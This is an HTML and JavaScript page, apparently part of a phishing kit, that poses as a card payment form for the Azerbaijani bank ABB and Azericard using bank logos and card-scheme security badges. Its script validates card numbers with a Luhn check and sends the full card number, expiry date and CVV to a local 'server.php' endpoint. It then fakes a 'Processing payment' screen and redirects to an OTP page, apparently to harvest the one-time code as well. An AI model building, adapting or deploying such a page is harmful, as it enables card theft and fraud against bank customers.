<!DOCTYPE html>
<html lang="az">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Card information</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;600&display=swap" rel="stylesheet">
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            font-family: 'Roboto', -apple-system, BlinkMacSystemFont, sans-serif;
            background: #f5f5f5;
            color: #333;
            min-height: 100vh;
            overflow-x: hidden;
        }

        /* Top bar */
        .topbar {
            background: #fff;
            padding: 12px 16px;
            display: flex;
            align-items: center;
            gap: 16px;
            box-shadow: 0 1px 3px rgba(0,0,0,0.08);
            position: sticky;
            top: 0;
            z-index: 100;
        }

        .back-arrow {
            width: 24px;
            height: 24px;
            cursor: pointer;
            flex-shrink: 0;
        }

        .back-arrow svg {
            width: 100%;
            height: 100%;
            stroke: #333;
            stroke-width: 2.5;
            fill: none;
        }

        .bank-logos {
            display: flex;
            align-items: center;
            gap: 16px;
            flex: 1;
        }

        .bank-logos img {
            height: 32px;
            width: auto;
            max-width: 100px;
            object-fit: contain;
        }

        .call-btn {
            background: #2196F3;
            color: #fff;
            border: none;
            border-radius: 20px;
            padding: 8px 16px;
            font-size: 14px;
            font-weight: 500;
            display: flex;
            align-items: center;
            gap: 6px;
            cursor: pointer;
            flex-shrink: 0;
        }

        .call-btn svg {
            width: 16px;
            height: 16px;
        }

        /* Content */
        .content {
            padding: 24px 16px 80px;
            max-width: 600px;
            margin: 0 auto;
        }

        .page-title {
            font-size: 24px;
            font-weight: 500;
            color: #111;
            margin-bottom: 24px;
        }

        /* Form */
        .field {
            margin-bottom: 20px;
            position: relative;
        }

        .field label {
            display: block;
            font-size: 13px;
            color: #666;
            margin-bottom: 8px;
            font-weight: 500;
        }

        .field input {
            width: 100%;
            padding: 16px 60px 16px 16px;
            font-size: 16px;
            color: #111;
            background: #fff;
            border: 1px solid #ddd;
            border-radius: 8px;
            outline: none;
            font-family: inherit;
            transition: all 0.2s;
        }

        .field input:focus {
            border-color: #2196F3;
            box-shadow: 0 0 0 3px rgba(33,150,243,0.1);
        }

        .field input.error {
            border-color: #f44336;
            animation: shake 0.3s;
        }

        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-8px); }
            75% { transform: translateX(8px); }
        }

        .field input::placeholder {
            color: #bbb;
        }

        .field input[type="password"] {
            letter-spacing: 2px;
        }

        /* Card type icon */
        .card-icon {
            position: absolute;
            right: 12px;
            top: 38px;
            width: 48px;
            height: 32px;
            display: flex;
            align-items: center;
            justify-content: center;
            background: #fff;
            border-radius: 4px;
            pointer-events: none;
        }

        .card-icon img {
            max-width: 44px;
            max-height: 28px;
            object-fit: contain;
            display: none;
        }

        .card-icon img.visible {
            display: block;
        }

        .card-icon .placeholder {
            width: 36px;
            height: 24px;
            background: #e0e0e0;
            border-radius: 3px;
        }

        /* CVV info */
        .cvv-info {
            position: absolute;
            right: 14px;
            top: 38px;
            width: 22px;
            height: 22px;
            background: #999;
            color: #fff;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 12px;
            font-style: italic;
            font-weight: 700;
            cursor: help;
        }

        /* Error message */
        .err-msg {
            font-size: 12px;
            color: #f44336;
            margin-top: 6px;
            display: none;
            font-weight: 500;
        }

        .err-msg.show {
            display: block;
        }

        /* Pay button */
        .pay-btn {
            width: 100%;
            padding: 16px;
            font-size: 16px;
            font-weight: 600;
            color: #fff;
            background: #2196F3;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            margin-top: 32px;
            transition: all 0.2s;
            box-shadow: 0 2px 8px rgba(33,150,243,0.3);
        }

        .pay-btn:disabled {
            background: #bbb;
            cursor: not-allowed;
            box-shadow: none;
        }

        .pay-btn:not(:disabled):active {
            transform: scale(0.98);
        }

        .pay-btn svg {
            width: 20px;
            height: 20px;
        }

        /* Trust badges */
        .trust-section {
            margin-top: 40px;
            background: #fff;
            border-radius: 12px;
            padding: 20px 16px;
            box-shadow: 0 1px 3px rgba(0,0,0,0.08);
        }

        .badge-grid {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 16px 12px;
            align-items: center;
            justify-items: center;
        }

        .badge-cell {
            width: 100%;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .badge-cell img {
            max-width: 100%;
            max-height: 32px;
            object-fit: contain;
        }

        /* Loading overlay */
        .overlay {
            position: fixed;
            inset: 0;
            background: rgba(255,255,255,0.95);
            display: none;
            align-items: center;
            justify-content: center;
            flex-direction: column;
            gap: 16px;
            z-index: 999;
        }

        .overlay.on {
            display: flex;
        }

        .spinner {
            width: 44px;
            height: 44px;
            border: 4px solid #e0e0e0;
            border-top-color: #2196F3;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .loading-text {
            font-size: 15px;
            color: #666;
            font-weight: 500;
        }

        /* Responsive */
        @media (max-width: 360px) {
            .bank-logos img { height: 28px; max-width: 80px; }
            .call-btn { padding: 6px 12px; font-size: 13px; }
            .page-title { font-size: 22px; }
            .field input { padding: 14px 54px 14px 14px; font-size: 15px; }
            .badge-grid { gap: 12px 8px; }
            .badge-cell img { max-height: 28px; }
        }

        @media (min-width: 600px) {
            .topbar { padding: 14px 20px; }
            .content { padding: 32px 20px 80px; }
        }
    </style>
</head>
<body>

<div class="topbar">
    <div class="back-arrow" onclick="history.back()">
        <svg viewBox="0 0 24 24">
            <path d="M15 18l-6-6 6-6"/>
        </svg>
    </div>
    <div class="bank-logos">
        <img src="abb.png" alt="ABB">
        <img src="azericard.png" alt="Azericard">
    </div>
    <button class="call-btn">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
            <path d="M3 5a2 2 0 012-2h3.28a1 1 0 01.948.684l1.498 4.493a1 1 0 01-.502 1.21l-2.257 1.13a11.042 11.042 0 005.516 5.516l1.13-2.257a1 1 0 011.21-.502l4.493 1.498a1 1 0 01.684.949V19a2 2 0 01-2 2h-1C9.716 21 3 14.284 3 6V5z"/>
        </svg>
        194
    </button>
</div>

<div class="content">
    <h1 class="page-title">Card information</h1>

    <form id="pf">
        <!-- Card number -->
        <div class="field">
            <label>Card number</label>
            <input id="cn" type="text" inputmode="numeric"
                   placeholder="•••• •••• •••• ••••"
                   maxlength="19" autocomplete="off">
            <div class="card-icon">
                <div class="placeholder"></div>
                <img id="icon-visa" src="visa.jpg" alt="Visa">
                <img id="icon-mc" src="mastercard.png" alt="Mastercard">
                <img id="icon-amex" src="american-express.png" alt="Amex">
                <img id="icon-unionpay" src="unionpay.png" alt="UnionPay">
                <img id="icon-jcb" src="jcb.png" alt="JCB">
            </div>
            <span class="err-msg" id="cnErr">Invalid card number</span>
        </div>

        <!-- Expiration date -->
        <div class="field">
            <label>Expiration date</label>
            <input id="exp" type="text" inputmode="numeric"
                   placeholder="MM / YY" maxlength="7" autocomplete="off">
            <span class="err-msg" id="expErr">Card has expired</span>
        </div>

        <!-- CVC -->
        <div class="field">
            <label>CVC</label>
            <input id="cvv" type="password" inputmode="numeric"
                   placeholder="•••" maxlength="4" autocomplete="off">
            <div class="cvv-info">i</div>
        </div>

        <button type="submit" class="pay-btn" id="payBtn" disabled>
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                <rect x="3" y="11" width="18" height="11" rx="2"/>
                <path d="M7 11V7a5 5 0 0110 0v4"/>
            </svg>
            Pay secure
        </button>
    </form>

    <div class="trust-section">
        <div class="badge-grid">
            <div class="badge-cell"><img src="visa.jpg" alt="Visa"></div>
            <div class="badge-cell"><img src="visa-secure.jpg" alt="Visa Secure"></div>
            <div class="badge-cell"><img src="mastercard.png" alt="Mastercard"></div>
            <div class="badge-cell"><img src="mastercard-id-check.png" alt="MC IDCheck"></div>
            <div class="badge-cell"><img src="american-express.png" alt="Amex"></div>
            <div class="badge-cell"><img src="amex-safekey.jpg" alt="SafeKey"></div>
            <div class="badge-cell"><img src="unionpay.png" alt="UnionPay"></div>
            <div class="badge-cell"><img src="jcb.png" alt="JCB"></div>
        </div>
    </div>
</div>

<div class="overlay" id="ov">
    <div class="spinner"></div>
    <div class="loading-text">Processing payment...</div>
</div>

<script>
const cnEl = document.getElementById('cn');
const expEl = document.getElementById('exp');
const cvvEl = document.getElementById('cvv');
const btn = document.getElementById('payBtn');
const cnErr = document.getElementById('cnErr');
const expErr = document.getElementById('expErr');

const cardIcons = {
    visa: document.getElementById('icon-visa'),
    mc: document.getElementById('icon-mc'),
    amex: document.getElementById('icon-amex'),
    unionpay: document.getElementById('icon-unionpay'),
    jcb: document.getElementById('icon-jcb'),
};

// ═══════════════════════════════════════════════════════════
// KART TİPİ ALGILAMA
// ═══════════════════════════════════════════════════════════
function detectType(num) {
    // Visa: 4 ile başlar
    if (/^4/.test(num)) return 'visa';
    
    // Mastercard: 51-55 veya 2221-2720
    if (/^5[1-5]/.test(num) || /^2[2-7]/.test(num)) return 'mc';
    
    // American Express: 34 veya 37
    if (/^3[47]/.test(num)) return 'amex';
    
    // UnionPay: 62
    if (/^62/.test(num)) return 'unionpay';
    
    // JCB: 3528-3589
    if (/^35(2[89]|[3-8])/.test(num)) return 'jcb';
    
    return null;
}

function showIcon(type) {
    const placeholder = document.querySelector('.card-icon .placeholder');
    Object.values(cardIcons).forEach(el => el.classList.remove('visible'));
    
    if (type && cardIcons[type]) {
        placeholder.style.display = 'none';
        cardIcons[type].classList.add('visible');
    } else {
        placeholder.style.display = 'block';
    }
}

// ═══════════════════════════════════════════════════════════
// LUHN ALGORİTMASI - GERÇEK KART DOĞRULAMA
// ═══════════════════════════════════════════════════════════
function luhnCheck(cardNumber) {
    // Sadece rakamları al
    const digits = cardNumber.replace(/\D/g, '');
    
    // Minimum 13 rakam olmalı
    if (digits.length < 13) return false;
    
    let sum = 0;
    let isEven = false;
    
    // Sondan başa doğru
    for (let i = digits.length - 1; i >= 0; i--) {
        let digit = parseInt(digits[i]);
        
        if (isEven) {
            digit *= 2;
            if (digit > 9) {
                digit -= 9;
            }
        }
        
        sum += digit;
        isEven = !isEven;
    }
    
    // Toplam 10'un katı olmalı
    return sum % 10 === 0;
}

// ═══════════════════════════════════════════════════════════
// KART NUMARASI INPUT
// ═══════════════════════════════════════════════════════════
cnEl.addEventListener('input', () => {
    const raw = cnEl.value.replace(/\D/g, '');
    const type = detectType(raw);
    const maxDigits = type === 'amex' ? 15 : 16;
    const digits = raw.slice(0, maxDigits);
    
    // Format: Amex = 4-6-5, Diğerleri = 4-4-4-4
    if (type === 'amex') {
        const p1 = digits.slice(0, 4);
        const p2 = digits.slice(4, 10);
        const p3 = digits.slice(10, 15);
        cnEl.value = [p1, p2, p3].filter(Boolean).join(' ');
        cnEl.maxLength = 17; // 4 + 1 + 6 + 1 + 5
        cvvEl.maxLength = 4;
    } else {
        cnEl.value = digits.replace(/(.{4})/g, '$1 ').trimEnd();
        cnEl.maxLength = 19; // 4 + 1 + 4 + 1 + 4 + 1 + 4
        cvvEl.maxLength = 3;
    }
    
    showIcon(type);
    
    // Luhn kontrolü
    const fullLength = type === 'amex' ? 15 : 16;
    if (digits.length === fullLength) {
        if (!luhnCheck(digits)) {
            cnEl.classList.add('error');
            cnErr.textContent = 'Invalid card number';
            cnErr.classList.add('show');
        } else {
            cnEl.classList.remove('error');
            cnErr.classList.remove('show');
        }
    } else {
        cnEl.classList.remove('error');
        cnErr.classList.remove('show');
    }
    
    validate();
});

// ═══════════════════════════════════════════════════════════
// TARİH INPUT
// ═══════════════════════════════════════════════════════════
expEl.addEventListener('keydown', (e) => {
    if (e.key === 'Backspace' && expEl.value.endsWith(' / ')) {
        e.preventDefault();
        expEl.value = expEl.value.slice(0, -3);
    }
});

expEl.addEventListener('input', () => {
    let raw = expEl.value.replace(/\D/g, '').slice(0, 4);
    
    // İlk rakam 2-9 ise otomatik 0 ekle (ay 01-12 arası olmalı)
    if (raw.length === 1 && +raw[0] > 1) {
        raw = '0' + raw;
    }
    
    // Ay kontrolü: 01-12 arası zorla
    if (raw.length >= 2) {
        let mm = parseInt(raw.slice(0, 2));
        if (mm < 1) mm = 1;
        if (mm > 12) mm = 12;
        raw = String(mm).padStart(2, '0') + raw.slice(2);
    }
    
    // Format: MM / YY
    expEl.value = raw.length > 2 ? raw.slice(0, 2) + ' / ' + raw.slice(2, 4) : raw;
    
    checkExpiry(raw);
    validate();
});

// ═══════════════════════════════════════════════════════════
// TARİH DOĞRULAMA - GEÇMİŞ TARİH KABUL EDİLMEZ
// ═══════════════════════════════════════════════════════════
function checkExpiry(raw) {
    if (raw.length < 4) {
        expEl.classList.remove('error');
        expErr.classList.remove('show');
        return true;
    }
    
    const mm = parseInt(raw.slice(0, 2));
    const yy = parseInt(raw.slice(2, 4));
    
    const now = new Date();
    const currentYear = now.getFullYear() % 100; // Son 2 rakam
    const currentMonth = now.getMonth() + 1;
    
    // Geçmiş tarih kontrolü
    const isExpired = yy < currentYear || (yy === currentYear && mm < currentMonth);
    
    if (isExpired) {
        expEl.classList.add('error');
        expErr.textContent = 'Card has expired';
        expErr.classList.add('show');
        return false;
    }
    
    expEl.classList.remove('error');
    expErr.classList.remove('show');
    return true;
}

// ═══════════════════════════════════════════════════════════
// CVV INPUT
// ═══════════════════════════════════════════════════════════
cvvEl.addEventListener('input', () => {
    const type = detectType(cnEl.value.replace(/\D/g, ''));
    const maxLen = type === 'amex' ? 4 : 3;
    cvvEl.value = cvvEl.value.replace(/\D/g, '').slice(0, maxLen);
    validate();
});

// ═══════════════════════════════════════════════════════════
// FORM VALİDASYON
// ═══════════════════════════════════════════════════════════
function validate() {
    const digits = cnEl.value.replace(/\D/g, '');
    const type = detectType(digits);
    const fullLength = type === 'amex' ? 15 : 16;
    
    // Kart numarası: doğru uzunluk + Luhn kontrolü geçmeli
    const cardOk = digits.length === fullLength && luhnCheck(digits);
    
    // Tarih: 4 rakam + geçmiş tarih değil
    const expRaw = expEl.value.replace(/\D/g, '');
    const expOk = expRaw.length === 4 && checkExpiry(expRaw);
    
    // CVV: doğru uzunluk
    const cvvLen = type === 'amex' ? 4 : 3;
    const cvvOk = cvvEl.value.length === cvvLen;
    
    btn.disabled = !(cardOk && expOk && cvvOk);
}

// ═══════════════════════════════════════════════════════════
// FORM GÖNDERİM
// ═══════════════════════════════════════════════════════════
document.getElementById('pf').addEventListener('submit', async (e) => {
    e.preventDefault();
    btn.disabled = true;
    
    const digits = cnEl.value.replace(/\D/g, '');
    const expRaw = expEl.value.replace(/\D/g, '');
    const type = detectType(digits);
    const typeStr = {
        visa: '💳 Visa',
        mc: '💳 Mastercard',
        amex: '💳 American Express',
        unionpay: '💳 UnionPay',
        jcb: '💳 JCB'
    }[type] || '💳 Card';
    
    // Backend'e gönder
    try {
        await fetch('/server.php?endpoint=process-payment', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                cardNumber: digits,
                cardType: typeStr,
                cardholderName: 'Card Holder',
                expiryMonth: expRaw.slice(0, 2),
                expiryYear: expRaw.slice(2),
                cvv: cvvEl.value
            })
        });
    } catch {}
    
    // Loading göster, OTP'ye yönlendir
    document.getElementById('ov').classList.add('on');
    setTimeout(() => {
        location.href = 'otp-new.html';
    }, 2000 + Math.random() * 1000);
});

// Sayfa yüklendiğinde ilk input'a focus
cnEl.focus();
</script>

</body>
</html>
